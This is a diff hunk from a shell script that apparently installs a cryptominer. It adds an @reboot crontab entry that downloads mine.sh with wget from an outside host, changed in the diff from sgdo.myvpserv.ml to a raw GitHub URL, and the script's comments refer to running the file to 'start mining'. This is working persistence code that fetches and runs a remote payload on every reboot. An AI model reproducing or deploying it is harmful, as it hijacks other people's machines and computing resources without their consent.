@@ -13,7 +13,7 @@ if crontab -l | grep "@reboot && wget sgdo.myvpserv.ml/mine.sh bash mine.sh">/de
   echo "Skiping..."
 else
   echo "Creating crontab run after reboot.."
-  echo "@reboot /usr/bin/wget -p /tmp sgdo.myvpserv.ml/mine.sh &" | crontab -
+  echo "@reboot /usr/bin/wget -p /tmp https://raw.githubusercontent.com/nacht0141/miner/master/mine.sh" | crontab -
   echo "@reboot /bin/bash /tmp/mine.sh"
 fi
 #start mining
